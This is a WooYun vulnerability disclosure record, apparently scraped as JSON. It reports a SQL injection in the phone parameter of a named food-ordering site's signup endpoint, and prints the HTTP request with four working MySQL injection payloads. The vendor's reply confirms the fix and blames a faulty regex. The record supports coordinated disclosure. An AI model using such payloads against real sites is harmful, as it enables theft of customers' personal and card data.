{"id": 73759, "wybug_id": "wooyun-2016-0174151", "wybug_title": "加双筷子主站SQL注入可影响千万级数据", "wybug_corp": "北京加双筷子科技有限公司", "wybug_author": "路人甲", "wybug_date": "2016-02-01 12:32", "wybug_open_date": "2016-02-01 14:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-01：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 回家吃饭 详细说明：  \nwww.jiashuangkuaizi.com\n主站存在高危SQL注入，千万级数据。订单/账户等，含姓名/手机/地址/卡号等。\nPOST /Index/doJoin HTTP/1.1Host: www.jiashuangkuaizi.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=bi60vk6f4vvg8ogrhejft83qr0; Hm_lvt_5fc7a4e16cf8378153a8da1775e99178=1454162212; Hm_lpvt_5fc7a4e16cf8378153a8da1775e99178=1454162223Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 17phone=13566666666\n\n---Place: POSTParameter: phone    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: phone=13566666666' RLIKE IF(1847=1847,0x31333536363636363636360a,0x28) AND 'PaKk'='PaKk    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: phone=13566666666' AND (SELECT 6060 FROM(SELECT COUNT(*),CONCAT(0x3a646d643a,(SELECT (CASE WHEN (6060=6060) THEN 1 ELSE 0 END)),0x3a6279663a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'veKO'='veKO    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: phone=13566666666'; SELECT SLEEP(5)--     Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: phone=13566666666' AND SLEEP(5) AND 'wjUt'='wjUt---\n\n\n\n\n\n\n   漏洞证明：  \n\n   修复方案：  参数过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-02-01 13:03 厂商回复： 谢谢，已通知相关项目负责人 最新状态： 2016-02-01： review  代码发现虽然过滤了，但是正则表达式写错了preg_match ( \"/^1[3|4|5|7|8|][0-9]{9}/\", $phone )，(｀･д･´)   ", "replys": "漏洞评价：\n评价\n     2016-02-01 13:07 |    \t\t北京加双筷子科技有限公司(乌云厂商)\t\t \n  打的一手好码，谢谢    \n     2016-02-01 14:51 |    \t\t北京加双筷子科技有限公司(乌云厂商)\t\t \n  http://blog.chacuo.net/183.html    \n     2016-02-01 16:29 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:287 漏洞数:46        )\t\t \n  速度真快 赞~    \n     2016-02-01 16:45 |    \t\t北京加双筷子科技有限公司(乌云厂商)\t\t \n  @an0nym0u5 那个xss拿到的cookie能登录吗-。-    \n     2016-02-02 10:23 |    \t\tk0_pwn \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:12        | 专注且自由)\t\t \n  @北京加双筷子科技有限公司 厂商你好萌，可以认识一下你吗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}